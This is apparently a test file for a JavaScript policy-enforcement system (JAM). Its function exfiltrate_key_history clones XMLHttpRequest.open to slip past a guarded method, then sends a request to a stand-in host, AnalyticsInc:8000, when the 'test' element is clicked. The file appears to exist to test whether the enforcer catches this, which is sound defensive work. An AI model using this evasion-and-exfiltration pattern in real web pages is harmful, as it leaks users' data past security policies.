// exfil_test_clone5.js
function copy(obj$$16) {
  if (typeof obj$$16 !== "object") {
    return obj$$16;
  } else {
    var value$$29 = obj$$16.valueOf();
    if (obj$$16 != value$$29) {
      return JAM.new(obj$$16.constructor, [value$$29]);
    } else {
      var v13 = obj$$16 instanceof obj$$16.constructor;
      if (v13) {
        v13 = obj$$16.constructor !== Object;
      }
      if (v13) {
        var c = clone(obj$$16.constructor.prototype);
        var property$$3;
        for (property$$3 in obj$$16) {
          if (obj$$16.hasOwnProperty(property$$3)) {
            var v2 = c;
            var v3 = property$$3;
            introspect(JAM.policy.p1) {
              var v15 = obj$$16[property$$3]
            }
            var v20 = copy(v15);
            JAM.set(v2, v3, v20);
          }
        }
      } else {
        c = {};
        for (property$$3 in obj$$16) {
          var v5 = c;
          var v6 = property$$3;
          introspect(JAM.policy.p1) {
            var v16 = obj$$16[property$$3]
          }
          var v21 = copy(v16);
          JAM.set(v5, v6, v21);
        }
      }
      return c;
    }
  }
  return;
}
function Clone() {
  return;
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v10 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v17 = xmlhttp.open
  }
  var v22 = copy(v17);
  v10.opennew = v22;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true]);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
